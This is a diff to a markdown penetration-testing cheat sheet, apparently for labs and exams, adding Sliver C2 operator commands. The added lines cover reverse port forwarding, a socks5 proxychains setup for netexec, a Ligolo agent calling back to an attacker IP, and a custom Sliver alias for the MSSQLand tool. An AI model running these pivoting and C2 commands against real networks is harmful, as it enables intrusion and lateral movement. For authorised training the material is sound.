@@ -244,6 +244,7 @@ sudo python Update-Hosts-File.py --protocols smb,rdp --subnet 192.168.130.0/24
 sudo python Update-Hosts-File.py --protocols smb,rdp --subnet 172.16.130.0/24
 ```
 
+> **Note**: This will not create domain entries for domain controllers.
 
 ### Nmap Scanning
 
@@ -764,8 +765,7 @@ execute -o net localgroup "Remote Management Users" userooo /add
 execute -o shutdown -r -t 0
 ```
 
-
-
+> **Note**: This only works if the `SeShutdownPrivilege` is available. PowerShell remoting uses **network logon** which does not support `SeShutdownPrivilege`.
 
 
 ## Credentials Dumping
@@ -1255,6 +1255,15 @@ Access port 3389 of the host 10.10.100.30 through our local ip:33890
 portfwd add -b 127.0.0.1:33890 -r 10.10.100.30:3389
 ```
 
+### Reverse Port Forwarding
+Forwarding connections from remote port **7999** to local port **7999**
+```
+sliver (CURIOUS_TRIANGLE) > rportfwd add -b 0.0.0.0:7999 -r 0.0.0.0:7999
+
+[*] Reverse port forwarding 0.0.0.0:7999 <- 0.0.0.0:7999
+```
+
+
 
 ### Socks5 Proxy
 
@@ -1262,6 +1271,18 @@ Select the session within sliver and then run the following - later configure `/
 
 ```powershell
 socks5 start
+```
+
+Verify `/etc/proxychains4.conf`
+
+```
+[ProxyList]
+socks5  127.0.0.1   1081
+```
+
+Use proxychains4
+```
+sudo proxychains4 -q netexec smb 172.16.103.152
 ```
 
 ### Ligolo
@@ -1303,6 +1324,8 @@ C:\Windows\tasks\agent.exe -connect 10.10.10.11:21 -ignore-cert -retry
 # Or run directly, will have to Ctrl + C and launch sliver again, don't worry though the process will keep running!
 execute -t 1000 -o C:\\Windows\\tasks\\agent.exe -connect 10.10.10.11:4444 -ignore-cert -retry
 
+# If you use it without -o it won't wait for console output and no need to ctrl + c
+execute C:\\Windows\\tasks\\agent.exe -connect 10.10.10.11:4444 -ignore-cert -retry
 
 # Select the session
 session
@@ -2182,6 +2205,54 @@ EXECUTE AS LOGIN = 'sa';EXEC sp_configure 'show advanced options', 1; RECONFIGUR
 ### MSSQLand
 
 > This is recommended for everything - labs/exam - @n3rada is really active, drop him a message for any bugs
+
+> **Note:** Sliver supports custom aliases
+
+#### Add Custom Command
+1. Locate aliases directory
+```
+/home/kali/.sliver-client/aliases
+```
+2. Create new folder `mssqland`
+3. Create `alias.json`
+
+```
+{
+    "name": "MSSQLand",
+    "version": "v1.0",
+    "command_name": "mssqland",
+    "original_author": "n3rada",
+    "repo_url": "https://github.com/n3rada/MSSQLand",
+    "help": "Effortlessly navigate and conquer linked Microsoft SQL Server (MS SQL) servers",
+    "entrypoint": "Main",
+    "allow_args": true,
+    "default_args": "/help",
+    "is_reflective": false,
+    "is_assembly": true,
+    "files": [
+      {
+        "os": "windows",
+        "arch": "amd64",
+        "path": "MSSQLand.exe"
+      },
+      {
+        "os": "windows",
+        "arch": "386",
+        "path": "MSSQLand.exe"
+      }
+    ]
+}
+```
+
+4. Paste compiled `MSSQLand.exe`
+5. Restart sliver
+
+```
+$ tree mssqland
+mssqland
+├── alias.json
+└── MSSQLand.exe
+```
 
 
 ```powershell
